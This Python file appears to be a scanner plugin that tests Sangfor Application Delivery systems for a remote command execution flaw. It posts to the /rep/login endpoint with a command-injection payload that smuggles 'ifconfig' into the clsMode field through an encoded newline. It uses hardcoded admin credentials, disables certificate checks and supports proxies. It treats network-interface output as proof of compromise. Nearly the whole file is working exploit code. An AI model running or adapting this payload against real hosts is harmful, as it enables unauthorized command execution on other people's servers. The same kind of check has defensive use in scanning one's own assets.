import requests
import time
from bs4 import BeautifulSoup
import logging
import json
import re

cdd=''
http = ''
https = ''
def dl181(dl):
    global http,https
    http=dl
    https=dl
def a(url1,s_cookie):
    global cdd
    url2='/rep/login'
    url3 = url1 + url2
    global http, https
    try:
        proxies = {'http': http,
                   'https': https}
        headers = {
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0',
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
            'X-Requested-With': 'XMLHttpRequest',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Connection': 'close'
        }
        data = """clsMode=cls_mode_login%0Aifconfig%0A&index=index&log_type=report&loginType=account&page=login&rnd=0&userID=admin&userPsw=123"""
        logging.captureWarnings(True)
        aa = requests.post(url3,cookies=s_cookie,headers=headers,data=data,proxies=proxies,verify=False,timeout=5)
        aa.encoding = 'utf-8'
        cd = BeautifulSoup(aa.text, 'html.parser')
        if 'eth0' in cd.text or '服务器异常' in cd.text:
            cdd=cd.text+'\nPOC:\n'+str(data)
        else:
            cdd='[-]漏洞不存在'
    except Exception as aaa:
        cdd='[-]请求错误\n'+str(aaa)
def jg9a():
    global cdd
    return '--------------------------------------------------\n[ 深信服应用交付系统RCE ]\n\n'+ str (cdd)+'\n'
def u9a(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        a(url1,s_cookie)
    elif pd=='1':
        a(url1,s_cookie)